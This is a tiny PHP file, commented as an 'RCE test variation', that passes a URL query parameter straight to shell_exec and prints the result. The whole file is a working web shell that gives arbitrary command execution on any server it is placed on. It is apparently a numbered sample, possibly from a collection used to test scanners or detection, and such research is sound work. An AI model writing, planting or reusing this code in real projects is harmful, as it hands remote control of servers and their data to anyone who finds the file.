<?php
// RCE test variation #1102
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>